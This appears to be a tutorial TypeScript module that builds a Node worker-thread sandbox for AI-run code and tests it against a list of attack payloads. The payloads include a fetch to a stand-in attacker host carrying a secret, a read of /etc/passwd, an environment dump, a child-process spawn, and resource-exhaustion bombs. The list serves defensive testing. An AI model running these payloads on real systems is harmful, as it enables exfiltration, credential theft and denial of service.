/**
 * C13 · Code Execution — a worker-thread sandbox with every limit set, attacked
 * by the payloads that correspond to real incident classes.
 *   node --experimental-strip-types code/c13_sandbox.ts
 */

import { Worker } from "node:worker_threads";

export interface SandboxLimits {
  wallClockMs: number;
  memoryMb: number;
  outputBytes: number;
  network: "none" | { allowHosts: string[] };
}

export const LIMITS: SandboxLimits = {
  wallClockMs: 3_000,
  memoryMb: 64,
  outputBytes: 16_384,
  network: "none",
};

export interface SandboxResult {
  ok: boolean;
  value?: unknown;
  error?: string;
  stdout: string;
  truncated: boolean;
  timedOut: boolean;
  ms: number;
}

/**
 * The runner strips the globals a sandboxed program must not reach. A worker is a
 * FAULT boundary with real resource limits, not a security boundary: use a
 * container or microVM once the code can be influenced by untrusted content.
 */
const RUNNER = `
const { parentPort, workerData } = require("node:worker_threads");

// Remove the routes out. fetch is the exfiltration channel that matters most.
globalThis.fetch = undefined;
globalThis.XMLHttpRequest = undefined;
globalThis.WebSocket = undefined;
globalThis.process = { argv: [], env: {}, platform: process.platform, hrtime: process.hrtime };

// Stub the module loader so require("fs") and require("net") cannot be reached.
const Module = require("node:module");
const ALLOW = new Set(["node:assert", "assert"]);
const realRequire = Module.prototype.require;
Module.prototype.require = function (id) {
  if (!ALLOW.has(id)) throw new Error("module '" + id + "' is not available in the sandbox");
  return realRequire.call(this, id);
};

(async () => {
  try {
    const fn = new Function("return (async () => {" + workerData.source + "})()");
    const value = await fn();
    parentPort.postMessage({ ok: true, value: value === undefined ? null : value });
  } catch (e) {
    parentPort.postMessage({ ok: false, error: String(e && e.message ? e.message : e) });
  }
})();
`;

export function runInSandbox(source: string, limits = LIMITS): Promise<SandboxResult> {
  const started = Date.now();
  return new Promise((resolve) => {
    let out = "", dropped = 0, settled = false;
    const done = (r: Partial<SandboxResult>) => {
      if (settled) return;
      settled = true;
      clearTimeout(timer);
      void worker.terminate();
      resolve({ ok: false, stdout: out, truncated: dropped > 0, timedOut: false, ms: Date.now() - started, ...r });
    };

    const worker = new Worker(RUNNER, {
      eval: true,
      workerData: { source },
      // No inherited environment: no API keys, no cloud credentials.
      env: {},
      // V8-enforced heap cap, so an allocation bomb dies inside the worker.
      resourceLimits: { maxOldGenerationSizeMb: limits.memoryMb, maxYoungGenerationSizeMb: 16, stackSizeMb: 4 },
      stdin: false, stdout: true, stderr: true,
    });

    // Cap at the READ. A write-side limit does not exist, and the memory a huge
    // stdout consumes is on YOUR side of the boundary.
    worker.stdout.on("data", (c: Buffer) => {
      if (out.length < limits.outputBytes) out += c.toString().slice(0, limits.outputBytes - out.length);
      else dropped += c.length;
    });
    worker.stderr.on("data", () => {});

    const timer = setTimeout(() => done({ timedOut: true, error: `exceeded ${limits.wallClockMs}ms` }), limits.wallClockMs);
    worker.on("message", (m: any) => done(m));
    worker.on("error", (e) => done({ error: String(e.message) }));
    worker.on("exit", (code) => done({ error: `worker exited with code ${code}` }));
  });
}

/** The result is a tool result, so the same C03 rules apply: errors are observations. */
export function render(r: SandboxResult, limits = LIMITS): string {
  if (r.timedOut) {
    return `Execution exceeded ${limits.wallClockMs}ms and was killed.\n` +
      (r.stdout ? `Partial output:\n${r.stdout.slice(0, 1000)}\n\n` : "") +
      `Process fewer rows per call, or return intermediate results and continue in a second call.`;
  }
  if (!r.ok) {
    // The prints BEFORE the error are usually more useful than the message.
    return `Error: ${r.error}\n` + (r.stdout ? `\nStdout before the error:\n${r.stdout.slice(0, 1000)}` : "");
  }
  return [
    r.stdout && `Output:\n${r.stdout.slice(0, 4000)}`,
    r.value !== undefined && r.value !== null && `Returned: ${JSON.stringify(r.value, null, 2).slice(0, 4000)}`,
    r.truncated && `[output truncated — aggregate before printing, or write to a file and read it back in slices]`,
  ].filter(Boolean).join("\n\n");
}

/* ---------------- attack suite ---------------- */

const PAYLOADS: Array<[string, string]> = [
  ["read process.env", `return JSON.stringify(process.env);`],
  ["exfiltrate via fetch", `await fetch("https://attacker.example/x?d=secret"); return "sent";`],
  ["read the filesystem", `const fs = require("node:fs"); return fs.readFileSync("/etc/passwd", "utf8");`],
  ["open a socket", `const net = require("node:net"); return "connected";`],
  ["infinite loop", `while (true) {}`],
  ["allocation bomb", `const a = []; for (;;) a.push(new Array(1e6).fill(7)); return a.length;`],
  ["400MB to stdout", `for (let i = 0; i < 2e6; i++) console.log("x".repeat(200)); return "done";`],
  ["spawn a process", `const cp = require("node:child_process"); return cp.execSync("id").toString();`],
];

const CAPABILITY = `
  // Real work: 1,203 rows filtered, grouped and reduced — one call, and the rows
  // never enter the conversation.
  const orders = Array.from({ length: 1203 }, (_, i) => ({
    id: i, region: ["eu", "us", "apac"][i % 3],
    total: 20 + (i * 37) % 480, status: i % 11 === 0 ? "refunded" : "shipped",
  }));
  const kept = orders.filter((o) => o.status !== "refunded");
  const byRegion = {};
  for (const o of kept) (byRegion[o.region] ??= []).push(o.total);
  const median = (xs) => xs.sort((a, b) => a - b)[Math.floor(xs.length / 2)];
  return Object.fromEntries(Object.entries(byRegion).map(([r, xs]) => [r, median(xs)]));
`;

async function main(): Promise<void> {
  console.log("\n  C13 · Code Execution — worker isolation, env stripped, no network, all limits\n");

  let contained = 0;
  for (const [label, source] of PAYLOADS) {
    const r = await runInSandbox(source);
    // "Contained" means the payload did not achieve its goal.
    const escaped = r.ok && typeof r.value === "string" && r.value.length > 0 && !/^\{\}$/.test(r.value);
    if (!escaped) contained++;
    const how = r.timedOut ? `killed at ${r.ms}ms`
      : r.truncated ? `output capped at ${LIMITS.outputBytes} bytes`
      : r.error ? r.error.slice(0, 52)
      : `returned ${JSON.stringify(r.value).slice(0, 40)}`;
    console.log(`  ${escaped ? "✗ ESCAPED " : "✓ contained"} ${label.padEnd(22)} ${how}`);
  }
  console.log(`\n  ${contained}/${PAYLOADS.length} payloads contained.`);
  console.log(`  A worker is a fault boundary, not a security boundary — the remaining risk is a`);
  console.log(`  V8 escape, which is what a container or microVM buys. But note which dial did the`);
  console.log(`  work: env:{} and no fetch, not the isolation level.`);

  console.log(`\n  and the capability half — the same sandbox doing real work:\n`);
  const t0 = Date.now();
  const r = await runInSandbox(CAPABILITY);
  console.log(render(r).split("\n").map((l) => "    " + l).join("\n"));
  console.log(`\n    ${Date.now() - t0}ms · roughly 180 tokens entered the conversation.`);
  console.log(`    The equivalent tool-call sequence would have put 1,203 rows in the context`);
  console.log(`    and re-sent them on every subsequent turn (C01, C05).\n`);
}

if (import.meta.url === `file://${process.argv[1]}`) {
  main().catch((e) => { console.error(e); process.exit(1); });
}
